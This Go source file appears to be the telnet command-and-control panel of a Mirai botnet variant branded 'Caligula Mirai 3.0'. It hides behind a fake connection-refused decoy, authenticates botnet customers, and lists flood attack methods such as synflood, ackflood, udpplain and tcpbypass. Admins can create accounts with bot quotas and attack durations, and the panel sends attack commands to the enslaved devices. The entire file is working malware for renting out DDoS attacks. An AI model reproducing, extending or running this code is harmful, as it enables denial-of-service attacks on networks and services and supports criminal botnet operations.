package main

import (
  "fmt"
  "net"
  "strconv"
  "strings"
  "time"
)

type Admin struct {
  conn  net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
  return &Admin{conn}
}

func banner(this *Admin) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[94m               ╔═╗  ╔═╗  ╦    ╦ \033[97m ╔═╗  ╦ ╦  ╦    ╔═╗\r\n"))
	this.conn.Write([]byte("\033[94m               ║    ╠═╣  ║    ║ \033[97m ║ ╦  ║ ║  ║    ╠═╣\r\n"))
	this.conn.Write([]byte("\033[94m               ╚═╝  ╩ ╩  ╩═╝  ╩ \033[97m ╚═╝  ╚═╝  ╩═╝  ╩ ╩ v3.0\r\n"))
}


func (this *Admin) Handle() {
  this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
  defer func() {
    this.conn.Write([]byte("\033[?1049l"))
  }()

  this.conn.SetDeadline(time.Now().Add(60 * time.Second))
  this.conn.Write([]byte("telnet: Unable to connect to remote host: Connection refused\r\n"))
  this.conn.Write([]byte(""))
  username, err := this.ReadLine(false)
  if err != nil {
    return
  }

  this.conn.SetDeadline(time.Now().Add(60 * time.Second))
  this.conn.Write([]byte(""))
  password, err := this.ReadLine(false)
  if err != nil {
    return
  }

  this.conn.SetDeadline(time.Now().Add(120 * time.Second))

  var loggedIn bool
  var userInfo AccountInfo
  if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
    this.conn.Write([]byte("\r\033[00;31mu gay buy the botnet pwease for 87394739437439847€ :^)\r\n"))
    buf := make([]byte, 1)
    this.conn.Read(buf)
    return
  }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Berts | Caligula Mirai 3.0 \007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	
	if userInfo.admin == 1 {
		fmt.Printf("\033[0m[\033[94mcaligula\033[0m] \033[94mUser connected! "+username+" \033[0m[\033[31mAdmin\033[0m]\r\n")
	} else {
		fmt.Printf("\033[0m[\033[94mcaligula\033[0m] \033[94mUser connected! "+username+" \033[0m[\033[94mUser\033[0m]\r\n")
	}
	this.conn.Write([]byte("\033[2J\033[1H"))
	banner(this)

  for {
    var botCatagory string
    var botCount int
    // катигула
	this.conn.Write([]byte("\033[94m" + username + "\033[97m@\033[94mкатигула\033[97m~# \033[94m"))
    cmd, err := this.ReadLine(false)
 
        if err != nil || cmd == "clear" || cmd == "cls" {
        this.conn.Write([]byte("\033[2J\033[1H"))
                this.conn.Write([]byte("\r\n\r\n"))
                	banner(this)
   
            continue
          }

    if err != nil || cmd == "methods" {
        this.conn.Write([]byte("\033[94m╔═══════════════════════════════════════════════╗   \033[0m \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!synflood [ip] [time] dport=[port]            \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!ackflood [ip] [time] dport=[port]            \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!rawflood [ip] [time] dport=[port] size=1440  \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!icmpflood [ip] [time] dport=[port] size=1440 \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!urgflood [ip] [time] dport=[port]            \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!rawbypass [ip] [time] dport=[port]           \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!tcpbypass [ip] [time] dport=[port]           \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!udpplain [ip] [time] dport=[port] size=1440  \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m╚═══════════════════════════════════════════════╝   \033[0m \r\n"))

            continue
        }




    if err != nil || cmd == "L4UDP" {
        this.conn.Write([]byte("\033[94m╔═══════════════════════════════════════════════╗   \033[0m \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!udpplain [ip] [time] dport=[port] size=1440  \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!rawbypass [ip] [time] dport=[port]           \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!rawflood [ip] [time] dport=[port] size=1440  \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m╚═══════════════════════════════════════════════╝   \033[0m \r\n"))

            continue
        }


    if err != nil || cmd == "L4TCP" {
        this.conn.Write([]byte("\033[94m╔═══════════════════════════════════════════════╗   \033[0m \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!synflood [ip] [time] dport=[port]            \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!ackflood [ip] [time] dport=[port]            \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!tcpbypass [ip] [time] dport=[port]           \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m╚═══════════════════════════════════════════════╝   \033[0m \r\n"))

            continue
        }

    if err != nil || cmd == "L4OTHER" {
        this.conn.Write([]byte("\033[94m╔═══════════════════════════════════════════════╗   \033[0m \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!icmpflood [ip] [time] dport=[port] size=1440 \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97m!urgflood [ip] [time] dport=[port]            \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m╚═══════════════════════════════════════════════╝   \033[0m \r\n"))

            continue
        }


      if err != nil || cmd == "help" {
        this.conn.Write([]byte("\033[94m╔═══════════════════════════════════════════════╗   \033[0m \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97mbots                                          \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97madduser                                       \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97maddadmin                                      \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97mremoveuser                                    \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97mL4TCP                                         \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97mL4UDP                                         \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m║ \033[97mL4OTHER                                       \033[94m║ \r\n"))
        this.conn.Write([]byte("\033[94m╚═══════════════════════════════════════════════╝   \033[0m \r\n"))

            continue
        }

        if userInfo.admin == 1 && cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[94m%s: \033[97m%d\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[94mTotal bots: \033[97m%d\r\n\033[0m", botCount)))
            continue
        }

        if cmd == "" {
            continue
        }

    if userInfo.admin == 1 && cmd == strings.ToLower("adduser") {
      this.conn.Write([]byte("Enter new username: "))
      new_un, err := this.ReadLine(false)
      if err != nil {
        return
      }
      this.conn.Write([]byte("Enter new password: "))
      new_pw, err := this.ReadLine(false)
      if err != nil {
        return
      }
      this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
      max_bots_str, err := this.ReadLine(false)
      if err != nil {
        return
      }
      max_bots, err := strconv.Atoi(max_bots_str)
      if err != nil {
        this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[97m\r\n", "Failed to parse the bot count")))
        continue
      }
      this.conn.Write([]byte("Max attack duration (0 for none): "))
      duration_str, err := this.ReadLine(false)
      if err != nil {
        return
      }
      duration, err := strconv.Atoi(duration_str)
      if err != nil {
        this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[97m\r\n", "Failed to parse the attack duration limit")))
        continue
      }
      this.conn.Write([]byte("Cooldown time (0 for none): "))
      cooldown_str, err := this.ReadLine(false)
      if err != nil {
        return
      }
      cooldown, err := strconv.Atoi(cooldown_str)
      if err != nil {
        this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[97m\r\n", "Failed to parse the cooldown")))
        continue
      }
      this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
      confirm, err := this.ReadLine(false)
      if err != nil {
        return
      }
      if confirm != "y" {
        continue
      }
      if !database.createUser(new_un, new_pw, max_bots, duration, cooldown) {
        this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[97m\r\n", "Failed to create new user. An unknown error occured.")))
      } else {
        this.conn.Write([]byte("\033[32mUser added successfully.\033[97m\r\n"))
      }
      continue
    }

    if userInfo.admin == 1 && cmd == strings.ToLower("addadmin") {
      this.conn.Write([]byte("Enter new username: "))
      new_un, err := this.ReadLine(false)
      if err != nil {
        return
      }
      this.conn.Write([]byte("Enter new password: "))
      new_pw, err := this.ReadLine(false)
      if err != nil {
        return
      }
      this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
      max_bots_str, err := this.ReadLine(false)
      if err != nil {
        return
      }
      max_bots, err := strconv.Atoi(max_bots_str)
      if err != nil {
        this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[97m\r\n", "Failed to parse the bot count")))
        continue
      }
      this.conn.Write([]byte("Max attack duration (0 for none): "))
      duration_str, err := this.ReadLine(false)
      if err != nil {
        return
      }
      duration, err := strconv.Atoi(duration_str)
      if err != nil {
        this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[97m\r\n", "Failed to parse the attack duration limit")))
        continue
      }
      this.conn.Write([]byte("Cooldown time (0 for none): "))
      cooldown_str, err := this.ReadLine(false)
      if err != nil {
        return
      }
      cooldown, err := strconv.Atoi(cooldown_str)
      if err != nil {
        this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[97m\r\n", "Failed to parse the cooldown")))
        continue
      }
      this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
      confirm, err := this.ReadLine(false)
      if err != nil {
        return
      }
      if confirm != "y" {
        continue
      }
      if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
        this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[97m\r\n", "Failed to create new user. An unknown error occured.")))
      } else {
        this.conn.Write([]byte("\033[32mUser added successfully.\033[97m\r\n"))
      }
      continue
    }

    if userInfo.admin == 1 && cmd == strings.ToLower("removeuser") {
      this.conn.Write([]byte("Enter username: "))
      new_un, err := this.ReadLine(false)
      if err != nil {
        return
      }
      if !database.removeUser(new_un) {
        this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[97m\r\n", "Failed to remove user. An unknown error occured.")))
      } else {
        this.conn.Write([]byte("\033[32mUser removed successfully.\033[97m\r\n"))
      }
      continue
    }
    
        botCount = userInfo.maxBots
        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("%s\033[37m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[37m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[37m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var AttackCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        AttackCount = userInfo.maxBots
                    } else {
                        AttackCount = clientList.Count()
                    }
                    fmt.Printf("\033[0m[\033[94mcaligula\033[0m] \033[94m"+username+" has sent a attack!\r\n")
                    this.conn.Write([]byte(fmt.Sprintf("\033[97m[\033[94m!\033[97m] \033[94mAttack has been sent to %d Devices! \033[97m[\033[94m!\033[97m]\r\n", AttackCount)))
                } else {
                     //no whitelist.
                     //his.conn.Write([]byte(f))
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
  buf := make([]byte, 500000)
  bufPos := 0

  for {
    n, err := this.conn.Read(buf[bufPos:bufPos+1])
    if err != nil || n != 1 {
    return "", err
    }
    if buf[bufPos] == '\xFF' {
    n, err := this.conn.Read(buf[bufPos:bufPos+2])
    if err != nil || n != 2 {
      return "", err
    }
    bufPos--
    } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
    if bufPos > 0 {
      this.conn.Write([]byte(string(buf[bufPos])))
      bufPos--
    }
    bufPos--
    } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
    bufPos--
    } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
    this.conn.Write([]byte("\r\n"))
    return string(buf[:bufPos]), nil
    } else if buf[bufPos] == 0x03 {
    this.conn.Write([]byte("^C\r\n"))
    return "", nil
    } else {
    if buf[bufPos] == '\033' {
      buf[bufPos] = '^';
      this.conn.Write([]byte(string(buf[bufPos])))
      bufPos++;
      buf[bufPos] = '[';
      this.conn.Write([]byte(string(buf[bufPos])))
    } else if masked {
      this.conn.Write([]byte("*"))
    } else {
      this.conn.Write([]byte(string(buf[bufPos])))
    }
    }
    bufPos++
  }
  return string(buf), nil
}
